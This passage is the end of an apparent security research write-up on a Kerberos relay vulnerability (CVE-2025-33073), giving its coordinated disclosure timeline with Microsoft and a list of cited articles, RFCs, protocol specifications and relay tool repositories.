-   2025-04-16: MSRC status change from “New” to “Review/Repro”.
    
-   2025-04-18: MSRC confirmation that the issue is valid and can be reproduced; information that this issue is a duplicate.
    
-   2025-04-24: MSRC tentative fix release planned for Patch Tuesday in July; agreement to not publish before then.
    
-   2025-05-30: MSRC fix release planned for Patch Tuesday in June; CVE-2025-33073 assigned.
    
-   2025-06-10: Patch Tuesday
    

* * *

1.  [https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html](https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html), “Using Kerberos for Authentication Relay Attacks”, James Forshaw, 2021-10-20, accessed 2025-03-19 [↩](#fnref:1 "return to article")
    
2.  [https://www.tiraniddo.dev/2024/04/relaying-kerberos-authentication-from.html](https://www.tiraniddo.dev/2024/04/relaying-kerberos-authentication-from.html), “Relaying Kerberos Authentication from DCOM OXID Resolving”, James Forshaw, 2024-04-29, accessed 2025-03-19 [↩](#fnref:2 "return to article")
    
3.  [https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/](https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/), ““Relaying” Kerberos - Having fun with unconstrained delegation”, Dirk-jan Mollema, 2019-02-18, accessed 2025-03-19 [↩](#fnref:3 "return to article")
    
4.  [https://dirkjanm.io/relaying-kerberos-over-dns-with-krbrelayx-and-mitm6/](https://dirkjanm.io/relaying-kerberos-over-dns-with-krbrelayx-and-mitm6/), “Relaying Kerberos over DNS using krbrelayx and mitm6”, Dirk-jan Mollema, 2022-02-22, accessed 2025-03-19 [↩](#fnref:4 "return to article")
    
5.  [https://github.com/dirkjanm/krbrelayx](https://github.com/dirkjanm/krbrelayx), by Dirk-jan Mollema (commit aef69a7e4d2623b2db2094d9331b2b07817fc7a4) [↩](#fnref:5 "return to article")
    
6.  [https://github.com/decoder-it/KrbRelayEx](https://github.com/decoder-it/KrbRelayEx), by Andrea Pierini [↩](#fnref:6 "return to article")
    
7.  [https://github.com/decoder-it/KrbRelay-SMBServer](https://github.com/decoder-it/KrbRelay-SMBServer), by Andrea Pierini [↩](#fnref:7 "return to article")
    
8.  [https://www.youtube.com/watch?v=rPZx1zbKJnI](https://www.youtube.com/watch?v=rPZx1zbKJnI), TROOPERS24: 10 Years of Windows Privilege Escalation with “Potatoes”, by Andrea Pierini [↩](#fnref:8 "return to article")
    
9.  [https://www.synacktiv.com/en/publications/relaying-kerberos-over-smb-using-krbrelayx](https://www.synacktiv.com/en/publications/relaying-kerberos-over-smb-using-krbrelayx), “Relaying Kerberos over SMB using krbrelayx”, Hugo Vincent, 2024-11-20, accessed 2025-03-19 [↩](#fnref:9 "return to article")
    
10.  [https://github.com/cube0x0/KrbRelay](https://github.com/cube0x0/KrbRelay) [↩](#fnref:10 "return to article")
     
11.  [https://en.hackndo.com/ntlm-relay/#what-can-be-relayed](https://en.hackndo.com/ntlm-relay/#what-can-be-relayed), Pixis / hackndo, 2020-04-01, accessed 2025-03-19 [↩](#fnref:11 "return to article")
     
12.  [https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/b4af186e-b2ff-43f9-b18e-eedb366abf13](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/b4af186e-b2ff-43f9-b18e-eedb366abf13), “Kerberos Network Authentication Service (V5) Synopsis”, 2024-04-23, accessed 2025-03-19 [↩](#fnref:12 "return to article")
     
13.  [https://en.hackndo.com/kerberos/](https://en.hackndo.com/kerberos/), “Kerberos”, Pixis / hackndo, 2019-02-02, accessed 2025-03-19 [↩](#fnref:13 "return to article")
     
14.  [https://datatracker.ietf.org/doc/html/rfc4120](https://datatracker.ietf.org/doc/html/rfc4120), “The Kerberos Network Authentication Service (V5)”, 2005-07, accessed 2025-03-19 [↩](#fnref:14 "return to article")
     
15.  [https://github.com/Kevin-Robertson/Powermad](https://github.com/Kevin-Robertson/Powermad), by Kevin Robertson (commit 3ad36e655d0dbe89941515cdb67a3fd518133dcb) [↩](#fnref:15 "return to article")
     
16.  [https://github.com/dirkjanm/forest-trust-tools/blob/881790dd0df047ce44c3c884dc36b55674cc262a/keytab.py](https://github.com/dirkjanm/forest-trust-tools/blob/881790dd0df047ce44c3c884dc36b55674cc262a/keytab.py), by Dirk-jan Mollema; also see [https://dirkjanm.io/active-directory-forest-trusts-part-two-trust-transitivity/#debugging-kerberos-the-easy-way](https://dirkjanm.io/active-directory-forest-trusts-part-two-trust-transitivity/#debugging-kerberos-the-easy-way) [↩](#fnref:16 "return to article")
     
17.  [https://datatracker.ietf.org/doc/html/rfc2478](https://datatracker.ietf.org/doc/html/rfc2478), “The Simple and Protected GSS-API Negotiation Mechanism”, 1998, accessed 2025-03-19, obsoleted by RFC4178 [↩](#fnref:17 "return to article")
     
18.  [https://datatracker.ietf.org/doc/html/rfc4178](https://datatracker.ietf.org/doc/html/rfc4178), “The Simple and Protected Generic Security Service Application Program Interface (GSS-API) Negotiation Mechanism”, 2005-10, accessed 2025-03-19 [↩](#fnref:18 "return to article")
     
19.  [https://datatracker.ietf.org/doc/html/rfc2743](https://datatracker.ietf.org/doc/html/rfc2743), “Generic Security Service Application Program Interface Version 2, Update 1”, 2000-01, accessed 2025-03-19 [↩](#fnref:19 "return to article")
     
20.  [https://datatracker.ietf.org/doc/html/rfc2744](https://datatracker.ietf.org/doc/html/rfc2744), “Generic Security Service API Version 2: C-bindings”, 2000-01, accessed 2025-03-19 [↩](#fnref:20 "return to article")
     
21.  [https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/166d8064-c863-41e1-9c23-edaaa5f36962](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/166d8064-c863-41e1-9c23-edaaa5f36962), “Privilege Attribute Certificate Data Structure”, 2023-06-28, accessed 2025-03-19 [↩](#fnref:21 "return to article")
     
22.  [https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-spng/f377a379-c24f-4a0f-a3eb-0d835389e28a](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-spng/f377a379-c24f-4a0f-a3eb-0d835389e28a), “Simple and Protected GSS-API Negotiation Mechanism (SPNEGO) Extension”, 2022-04-27, accessed 2025-03-19 [↩](#fnref:22 "return to article")
     
23.  [https://www.redteam-pentesting.de/publications/2025-06-11-Reflective-Kerberos-Relay-Attack_RedTeam-Pentesting.pdf](https://www.redteam-pentesting.de/publications/2025-06-11-Reflective-Kerberos-Relay-Attack_RedTeam-Pentesting.pdf) [↩](#fnref:23 "return to article")
     
24.  [https://www.synacktiv.com/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025](https://www.synacktiv.com/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025) [↩](#fnref:24 "return to article")
